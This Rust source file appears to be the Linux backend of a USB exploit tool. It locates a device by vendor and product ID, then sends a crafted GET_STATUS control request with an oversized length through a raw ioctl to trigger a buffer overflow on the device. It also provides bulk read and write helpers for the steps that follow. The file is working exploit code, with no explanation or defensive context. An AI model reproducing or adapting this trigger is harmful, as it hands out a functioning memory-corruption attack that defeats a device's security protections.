use std::fs::OpenOptions;
use std::io;
use std::mem;
use std::os::unix::io::AsRawFd;
use std::path::PathBuf;
use std::time::Duration;

// USB constants
const STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT: u8 = 0x82;

// Interface requests
const GET_STATUS: u8 = 0x0;

// Linux
const IOCTL_IOR: u64 = 0x80000000;
const IOCTL_NR_SUBMIT_URB: u64 = 10;
const URB_CONTROL_REQUEST: u8 = 2;
const SETUP_PACKET_SIZE: usize = 8;

/// Abstracts over platform-dependant exploit backends so multiple platforms may be supported.
pub trait ExploitBackend {
    /// Scan USB devices, returning an attached exploit backend for the first device matching the
    /// `vid` and `pid` pair.
    fn discover(vid: u16, pid: u16) -> Result<Self, ()>
    where
        Self: Sized;

    /// Trigger the buffer overflow by sending a USB control request.
    fn trigger_vulnerability(&self, length: usize) -> Result<(), io::Error>;

    /// Performs a bulk read on the bound USB device.
    fn read(&self, buf: &mut [u8]) -> Result<usize, rusb::Error>;

    /// Performs a bulk write on the bound USB device.
    fn write(&self, buf: &[u8]) -> Result<usize, rusb::Error>;
}

/// Linux exploit backend using `libusb`.
pub struct LinuxBackend {
    device_handle: rusb::DeviceHandle<rusb::GlobalContext>,
    bus: u8,
    address: u8,
}

impl LinuxBackend {
    fn device_path(&self) -> PathBuf {
        PathBuf::from(format!("/dev/bus/usb/{:03}/{:03}", self.bus, self.address))
    }
}

impl ExploitBackend for LinuxBackend {
    fn discover(vid: u16, pid: u16) -> Result<Self, ()> {
        let device = rusb::devices()
            .expect("Could not list USB devices")
            .iter()
            .filter(|device| {
                if let Ok(descriptor) = device.device_descriptor() {
                    descriptor.vendor_id() == vid && descriptor.product_id() == pid
                } else {
                    false
                }
            })
            .take(1)
            .next()
            .ok_or(())?;
        let mut device_handle = device.open().expect("Failed to open USB device");

        // Claim the interface we'll use. This is required before calling read().
        let config = device.active_config_descriptor().map_err(|_| ())?;
        let interface = config
            .interfaces()
            .find(|interface| {
                interface.descriptors().any(|descriptor| {
                    descriptor
                        .endpoint_descriptors()
                        .any(|ep_descriptor| ep_descriptor.address() == 0x81)
                })
            })
            .map(|interface| interface.number())
            .ok_or(())?;
        device_handle.claim_interface(interface).map_err(|_| ())?;

        // Return Self with the opened device handle. The claimed interface will be released when
        // the device handle is dropped.
        Ok(Self {
            device_handle,
            bus: device.bus_number(),
            address: device.address(),
        })
    }

    fn trigger_vulnerability(&self, length: usize) -> Result<(), io::Error> {
        // Open USB file as read-write and get the raw file descriptor for use with libc.
        let path = self.device_path();
        println!("opening usb device at {:?}", path);
        let file = OpenOptions::new().read(true).write(true).open(path)?;
        let fd = file.as_raw_fd();

        // Build the IoctlUrb request.
        assert!(length <= u16::MAX as usize);
        let packet = build_packet(length as u16);
        let mut request = IoctlUrb::with_buffer(&packet);
        let ioctl_number: u64 =
            IOCTL_IOR | (mem::size_of::<IoctlUrb>() << 16) as u64 | 0x55 << 8 | IOCTL_NR_SUBMIT_URB;

        // Call ioctl() and warn about any errors.
        match unsafe {
            libc::ioctl(
                fd,
                ioctl_number,
                &mut request as *mut IoctlUrb as *mut libc::c_void,
            )
        } {
            0 => println!("ioctl success"),
            libc::EBADF => panic!("bad file descriptor"),
            libc::EFAULT => panic!("argp references inaccessible memory"),
            libc::EINVAL => panic!("request or argp not valid"),
            libc::ENOTTY => panic!("fd is not associated with a special device"),
            other => {
                println!("unknown error code {} from ioctl()", other);
                let last_err = std::io::Error::last_os_error();
                return Err(last_err);
            }
        };

        Ok(())
    }

    fn read(&self, buf: &mut [u8]) -> Result<usize, rusb::Error> {
        self.device_handle
            .read_bulk(0x81, buf, Duration::from_secs(1))
    }

    fn write(&self, buf: &[u8]) -> Result<usize, rusb::Error> {
        self.device_handle
            .write_bulk(0x01, buf, Duration::from_secs(1))
    }
}

/// Build the buffer for the IoctlUrb buffer.
fn build_packet(length: u16) -> Vec<u8> {
    let mut buffer = vec![0u8; length as usize + SETUP_PACKET_SIZE];
    buffer[0] = STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT.to_le();
    buffer[1] = GET_STATUS.to_le();
    // four bytes of zero
    let length = length.to_le_bytes();
    buffer[6] = length[0];
    buffer[7] = length[1];

    buffer
}

#[repr(C)]
struct IoctlUrb {
    pub r#type: u8,
    pub endpoint: u8,
    pub status: i32,
    pub flags: u32,
    pub buffer: *const u8,
    pub buffer_length: i32,
    pub actual_length: i32,
    pub start_frame: i32,
    pub stream_id: u32,
    pub error_count: i32,
    pub signr: u32,
    /// User context pointer is always null for our purposes.
    pub usercontext: *const libc::c_void,
}

impl IoctlUrb {
    fn with_buffer(buffer: &[u8]) -> Self {
        assert!(buffer.len() <= i32::MAX as usize);
        Self {
            r#type: URB_CONTROL_REQUEST,
            endpoint: 0,
            status: 0,
            flags: 0,
            buffer: buffer.as_ptr(),
            buffer_length: buffer.len() as i32,
            actual_length: 0,
            start_frame: 0,
            stream_id: 0,
            error_count: 0,
            signr: 0,
            usercontext: std::ptr::null(),
        }
    }
}
